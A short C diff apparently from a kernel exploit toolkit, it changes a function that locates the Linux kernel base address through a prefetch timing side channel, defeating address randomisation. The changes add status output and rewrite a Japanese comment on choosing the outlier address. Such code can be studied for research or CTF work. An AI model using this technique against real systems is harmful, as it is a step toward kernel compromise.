@@ -51,6 +51,7 @@ static uint64_t find_outlier_index(const uint64_t *times, uint64_t count) {
 }
 
 uint64_t prefetch_kbase() {
+    puts("[ ] finding kbase by prefetch side-channel attack");
     uint64_t num_trials = 10;
     const uint64_t num_vote = 10;
     const uint64_t start = 0xffffffff81000000;
@@ -76,8 +77,7 @@ uint64_t prefetch_kbase() {
                     min_time[i] = MIN(time, min_time[i]);
                 }
             }
-            // 最も実行時間が短かったアドレスに投票
-            // 汎用的には、一番離れているアドレスに投票するべき
+            // 最も平均から離れているアドレスに投票
             const uint64_t outlier_index = find_outlier_index(min_time, num_steps);
             cand_addr[vote] = (start + step * outlier_index) & ~0xfffff;
         }
@@ -91,10 +91,12 @@ uint64_t prefetch_kbase() {
                 }
             }
             if (count > num_vote / 2) {
+                printf("[+] found kbase by prefetch side-channel attack");
+                printf("[+] kbase = %#lx\n", addr);
                 return addr;
             }
         }
     }
-    puts("[-] unable to detect kbase");
+    puts("[-] unable to detect kbase by prefetch side-channel attack");
     return 0;
 }
